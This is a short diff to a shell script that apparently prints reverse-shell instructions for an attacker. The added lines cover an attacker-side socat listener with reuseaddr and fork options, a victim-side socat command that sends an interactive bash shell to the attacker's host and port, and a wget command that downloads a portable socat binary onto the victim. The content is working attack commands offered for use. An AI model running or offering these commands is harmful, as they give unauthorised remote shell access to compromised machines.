@@ -54,10 +54,14 @@ then
 	echo "On Attacker set up listener:"
 	echo ""
 	echo "socat file:\`tty\`,raw,echo=0 tcp-listen:$turtlepower_LPORT"
+	echo "Or to preserve the socket or if you are having bind address in use errors"
+	echo "socat file:\`tty\`,raw,echo=0 tcp-listen:$turtlepower_LPORT,reuseaddr,fork"
 	echo ""
 	echo "On Victim:"
 	echo ""
 	echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$turtlepower_lhost:$turtlepower_LPORT"
+	echo "(If you need a portable binary try:)"
+	echo "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
 	echo ""
 
 # not a method
@@ -78,4 +82,3 @@ then
 else
     exit
 fi
-
